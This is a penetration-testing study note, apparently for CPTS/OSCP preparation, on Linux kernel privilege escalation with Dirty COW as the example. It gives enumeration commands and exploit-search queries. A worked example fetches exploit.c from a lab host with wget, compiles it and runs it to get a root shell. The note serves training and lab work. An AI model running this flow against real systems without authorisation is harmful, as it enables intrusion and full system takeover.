🧠 Kernel Exploits – Root via Vulnerable Kernel
🔑 Concept
Kernel-level privilege escalation exploits vulnerabilities in the Linux kernel itself — meaning no matter what user you are, if the kernel is vulnerable and you trigger the exploit successfully, you can go straight to root.

Think of kernel exploits as "god mode unlocks" — high impact, but risky due to potential system crashes or lockups.

🧠 Key Facts
Element	Description
Target	Kernel itself (not apps, scripts, or services)
Goal	Spawn a root shell by exploiting a kernel bug
Famous Example	Dirty COW (CVE-2016-5195)
Danger Level	☠️ Can crash, freeze, or corrupt the system — don’t run on prod unless safe
Why it Works	Many legacy systems are never patched due to service/app compatibility
Detection Precursor	uname -a to check kernel version
🔍 Enumeration Phase
Start with this every time:

bash
Copy
Edit
uname -a
cat /etc/os-release    # or /etc/lsb-release
This gives you:

Kernel version (e.g. 4.4.0-116-generic)

Distro info (e.g. Ubuntu 16.04.4 LTS)

Now Google it:

"linux 4.4.0-116-generic exploit"
or
"Ubuntu 16.04 LTS kernel exploit site:exploit-db.com"

🚀 Exploitation Flow
💣 TL;DR "Got This? Do That" Flow:
markdown
Copy
Edit
IF `uname -a` shows a known vulnerable kernel
  ⬇
Search Exploit-DB or GitHub for the matching kernel exploit
  ⬇
Download exploit to target (`wget`, `curl`, `scp`, Python HTTP server)
  ⬇
Compile it: `gcc exploit.c -o exploit`
  ⬇
Set permissions: `chmod +x exploit`
  ⬇
Run it: `./exploit`
  ⬇
You either crash the box 😅 … or land root 🏴‍☠️
🛡️ Pro-Tips for Safety
Tip	Why
🧪 Run on a snapshot or throwaway box	Kernel exploits can hang or crash
🧰 Use LinPEAS / kernel-exploits.py	They enumerate kernel versions and suggest matching exploits
🔍 Check if it's patched	Some systems show patched kernel but still vulnerable (like in your example)
🔂 Try multiple PoCs	Many kernel exploits have 2–3 variants floating around
📆 Check exploit date	Use newer PoCs if older ones fail (e.g. Dirty COW from 2016 vs newer 2021 variants)
🔧 Example Walkthrough
You found:

bash
Copy
Edit
uname -a
# Linux NIX02 4.4.0-116-generic
Google result says: vulnerable to Dirty COW. ✅
You find the C code on GitHub or Exploit-DB, then:

bash
Copy
Edit
wget http://10.10.14.3/exploit.c
gcc exploit.c -o exploit && chmod +x exploit
./exploit
If successful:

bash
Copy
Edit
whoami
# root
🧠 Final Takeaways
Kernel exploits are the nuclear option when nothing else works.

They're most useful on:

Legacy systems

Hardened but outdated environments

Great fallback to keep in your CPTS/OSCP playbook

Use with care — or at the very least, snapshot first.
